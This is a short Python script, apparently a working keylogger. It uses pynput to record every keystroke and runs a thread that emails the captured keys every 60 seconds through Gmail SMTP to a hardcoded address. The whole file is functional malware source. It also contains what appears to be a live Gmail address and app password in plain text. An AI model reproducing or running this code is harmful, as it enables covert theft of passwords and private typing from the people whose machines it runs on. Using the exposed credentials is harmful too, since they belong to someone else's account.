import smtplib
import ssl
import threading
from pynput.keyboard import Key, Listener
import time

# Keylogger part
keys = []

def on_press(key):
    global keys
    try:
        # For regular keys
        print(f"{key.char} pressed")
        keys.append(str(key.char))
    except AttributeError:
        # For special keys
        special_keys = {
            Key.space: 'Space',
            Key.enter: 'Enter',
            Key.shift: 'Shift',
            Key.backspace: 'Backspace',
            Key.cmd: 'Cmd',  # Windows key
            Key.alt: 'Alt',
            Key.ctrl: 'Ctrl',
            Key.left: 'Left',
            Key.right: 'Right',
            Key.up: 'Up',
            Key.down: 'Down',
            # Add more special keys as needed
        }
        if key in special_keys:
            print(f"{special_keys[key]} pressed")
            keys.append(special_keys[key])

def on_release(key):
    if key == Key.esc:
        return False

# Email part
def send_email(message):
    smtp_server = "smtp.gmail.com"
    port = 587  # For starttls
    sender_email = "yogaakash1230@gmail.com"  # Enter your address
    password = "imlv losw nqpm zbyi"  # Enter your password
    receiver_email = "yogaakash1230@gmail.com"  # Enter receiver address

    context = ssl.create_default_context()

    try:
        server = smtplib.SMTP(smtp_server, port)
        server.ehlo()
        server.starttls(context=context)
        server.ehlo()
        server.login(sender_email, password)
        server.sendmail(sender_email, receiver_email, message)
    except Exception as e:
        print(e)
    finally:
        server.quit()

def email_timer():
    global keys
    while True:
        time.sleep(60)  # Wait for 60 seconds
        if keys:
            send_email(' '.join(keys))
            keys = []  # Reset the keys list after sending the email

# Start the keylogger
listener = Listener(on_press=on_press, on_release=on_release)
listener.start()

# Start the email timer thread
timer_thread = threading.Thread(target=email_timer)
timer_thread.start()

listener.join()
timer_thread.join()
